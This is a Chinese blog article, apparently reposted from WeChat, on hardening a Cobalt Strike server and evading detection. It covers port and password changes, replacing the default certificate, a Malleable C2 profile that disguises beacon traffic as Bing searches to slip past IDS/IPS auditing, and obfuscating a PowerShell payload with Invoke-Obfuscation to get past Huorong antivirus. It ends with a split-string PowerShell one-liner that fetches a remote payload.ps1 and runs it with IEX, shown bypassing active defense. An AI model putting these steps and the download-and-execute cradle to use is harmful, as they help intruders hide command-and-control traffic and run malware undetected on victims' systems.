> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Kc-nzt9aU6oFc9_Emkhm3A)

**前言：**

现如今，随着国家的重视，安全已不是曾经拿啊 D、明小子一把梭的时代，渗透环境愈发复杂，渗透与反渗透已变成常态，CS 作为渗透利器，简单的安装使用已不能满足现在的需求，在此，Record 一篇 CS 加固 + 免杀的文章。从五个角度叙述如何对 CS 进行加固 + 免杀，让 CS 满足现在渗透的环境，五个角度分别为端口、密码、证书、流量、免杀。这五个角度满足的需求分别是反渗透、Bypass 流量审计、免杀过杀毒软件。  

**目录：**

0x00 反渗透

0x01Bypass 流量审计

0x02 免杀过杀毒软件

**0x00 反渗透**  

在攻防演练的过程中，听说一些攻击者，被防守方直接拿下 CS 服务器，思路大概是这样，首先被蜜罐或安全设备获取攻击 IP，然后通过默认端口和弱口令拿下 CS 服务器，为了避免这种情况，我们需要对自己的 CS 服务器做反渗透加固，这里主要说两点，端口和密码。  

**端口**

默认 CS 端口为 50050，我们需要对该端口进行修改，可通过 vim teamserver 来修改端口，在如下箭头处进行修改，这里我改为 55555 端口。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRb34QX52ZTofkAfpB1Sib7rLArJ7ybax9MACwiaFbRkN96GJicU5iaWJ5XMV2YSWdo8c0jVSk1kYK0quA/640?wx_fmt=jpeg)

**密码**

CS 密码禁止使用弱口令，口令应满足一定的复杂度，如使用长度 8 位以上，包含字母、数字、特殊符号组成密码。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRb34QX52ZTofkAfpB1Sib7rLLcSMJvRWibiam2DSNbKBQIZPT10RXNRrqxpzCqFV0TibFDQQQmY25QnbQ/640?wx_fmt=jpeg)

**0x01Bypass 流量审计**  

说了 CS 的加固，那么也不要忘了 CS 的作用是什么，其为后渗透的工具。因为该款工具所使用的人太多，所以其流量则被各款流量审计所监控，其特征被也被相应记录，而各个厂商或多或少的都采购或自研流量审计，包括但不限于 IPS、IDS、全流量、态势感知等，用于在大数据中匹配攻击行为。流量审计的广泛应用，导致原生 CS 已不适用现有环境，那么便需要做一些修改，修改分两点，证书和流量。  

**证书**

CS 存在默认证书，通过命令可查看，查看命令为

```
keytool -list -v -keystore cobaltstrike.store
```

如下为默认 CS 证书

**![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRb34QX52ZTofkAfpB1Sib7rLtT0c8dIBMaoVKSrzgbCZsbBYnA3yQkncjRMXaBBFQocf9wiafNkibnqQ/640?wx_fmt=jpeg)**

默认 CS 证书如上，存在明显特征，所以在这要用不包含特征的证书去替换，CS 工具包下存在 keytool 工具，其为 JAVA 数据证书管理工具，通过命令可生成证书，生成命令如下

```
keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname "CN=US, OU="baidu.com", O="Sofatest", L=Beijing, ST=Cyberspace, C=CN"
```

查看新生成的证书，如下

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRb34QX52ZTofkAfpB1Sib7rLrjm0X4quibibYLUHrDbtGAoItfpFRhC9jIa5fz9G7icmRVBrIWzBauibicQ/640?wx_fmt=jpeg)

**流量**

CS 流量如之前所说，已被相应流量审计软件所监控，所以原 CS 已不适用现有攻防环境，那么是否就没办法了呢？并不是，CS 开发团队早已想到了这一点，其存在配置文件，用来自定义客户端 / 服务端双向通信的流量格式以及软件相应配置，配置文件中的自定义客户端 / 服务端双向通信流量格式就可被我们用来绕过流量审计，如下 http-get、http-post 就是用来自定义数据格式的配置。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRb34QX52ZTofkAfpB1Sib7rLFibXLRjRaTfc5WZmudBPssaNlLicjE1NILIcPWpgptmBjmneFXWdVEmQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRb34QX52ZTofkAfpB1Sib7rLVicmoyjliawqFW5h5rxTJUAPO7AGiaPEeBxPuHGjgv9nIJR74eDdeOpZA/640?wx_fmt=jpeg)

这里，有兴趣的可自行看看配置如何写，我这边就直接 github 上找了一份用，地址如下：  

```
https://github.com/xx0hcd/Malleable-C2-Profiles/tree/master/normal
```

用了一份伪造 bing 搜索引擎的 C2-Profile  

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRbFaAUibBpc6f1Ma9SicVWX8fLI3BZxnYIEDHZLNPkDkq3MPAxLHGdKcH1ze9Y28gsab3SIp2mn5y8A/640?wx_fmt=jpeg)

C2-Profile 下载后，使用命令如下  

```
查看配置是否可用：
./c2lint /root/cobaltstrike4.0/bing_maps.profile

启动配置
./teamserver 服务器ip cs密码 /root/cobaltstrike4.0/bing_maps.profile
```

CS 服务端加载 C2 配置后，本地运行 http-beacon，wireshark 抓取流量包，查看流量是否如自己设置那样，实验结果的确如配置所示。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRbFaAUibBpc6f1Ma9SicVWX8faplic2yZaK62EER4PWCzHc4iaaLRBtKRFfHEkBjZo8nLickI6FOSVjNYQ/640?wx_fmt=jpeg)

**0x02 免杀过杀毒软件**  

首先，简单聊聊自己对免杀思路的看法，随着时代的变换，攻与防都与时俱进，自己最早接触安全的时候，是灰鸽子、大白鲨，抓鸡拿服务器的时期，在那个时期，免杀的方法基本为加区、加花、加壳、改特征码、改资源、捆绑等，通过这些方法，就可绕过杀软的主被动防御。如今，杀软在升级，免杀方法也在升级，现在的免杀方法更多为分离、白加黑的思路，常规免杀方法为加载器、混淆编码等，有代码能力可自写，无的话网上也有很多现成的方法，拿加载器举例：shellcode_launcher 就可用来免杀杀毒软件，尽管原有特征已被杀软记录，但通过源码免杀改改函数即可绕过杀软继续使用。

其次，聊一聊杀毒软件杀什么，杀毒软件到底是怎么识别某程序为病毒程序呢？用自己的话来说，杀软归根结底，识别的是**程序特征**，特征包含三个方面：文件特征、内存特征、行为特征。

知道了杀软杀什么，那么免杀，其实也就不是特别的难了，免杀，用自己的话来解释，就是**改变程序特征且保持原有功能**。改变程序特征是为了让杀毒软件不把程序识别为恶意，保持原有功能就更好理解了，若程序修改后无法运行，那么即使过了杀毒软件也是一件没有意义的事。

本文章免杀的方法为 Powershell 远程加载 + Payload 混淆，最后 CS 成功上线

复现步骤如下，首先 CS 生成 Powershell 脚本，该脚本，不用说，肯定被杀软标记为恶意，所以要想绕过，我们需要改特征，改特征选用 Invoke-Obfuscation，其为 Powershell 编码器，地址如下：

```
https://github.com/danielbohannon/Invoke-Obfuscation
```

下载后，使用方法为 导入 -> 设置免杀脚本路径 -> encoding 编码 -> 选择编码方式 -> 设置编码后输出文件路径。

```
导入
Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation

设置
set scriptpath F:\渗透必备\免杀\Invoke-Obfuscation\payload.ps1

编码
encoding

选择编码方式
1-8

设置编码后输出文件路径
out F:\渗透必备\免杀\Invoke-Obfuscation\payload1.ps1
```

这里使用火绒查杀一下编码后的文件，如下图，未发现安全风险。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRbFaAUibBpc6f1Ma9SicVWX8flib6bHib3CkGZzJNzbQPMcbjqEG9r9TibhOibMyC6S50iafvtmOFwb8lWDQ/640?wx_fmt=jpeg)

文件已免杀，后续就是 Powershell 执行了，这里有两种方法，

一：采用把文件下载到本地，powershell 执行；

二：文件放到服务器，远程 Powershell 执行。

考虑到少交互的原则，第一步还需上传文件到本地，多了一步骤，故选用第二种方案。  

这里把 ps1 传到个人博客做远程加载演示，上传后可访问  

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRbFaAUibBpc6f1Ma9SicVWX8f1GoYWj7WSP2icnic52UROfNaFG0WYdjkj7xCb7nm7YeFMCeRlF2Xib62g/640?wx_fmt=jpeg)

下一步，即执行 powershell 命令，可 powershell 行为特征也被火绒记录在册，可通过如下方式，绕过火绒该防护。

```
powershell.exe "$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''http://www.bywalks.com/payload1.ps1''))';$a3="$a1,$a2";IEX(-join $a3)"
```

可绕过火绒主动防御  

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib3VCxzGNvRbFaAUibBpc6f1Ma9SicVWX8fJiagkaxe3bqLdXxGlqh69MtFqqQU7JtJ50p4XaUd2lWaaxDiaZ4IicwFQ/640?wx_fmt=jpeg)

**参考文章：**

https://paper.seebug.org/1349/

https://cloud.tencent.com/developer/article/1759951

https://www.chabug.org/web/832.html

https://github.com/TideSec/BypassAntiVirus/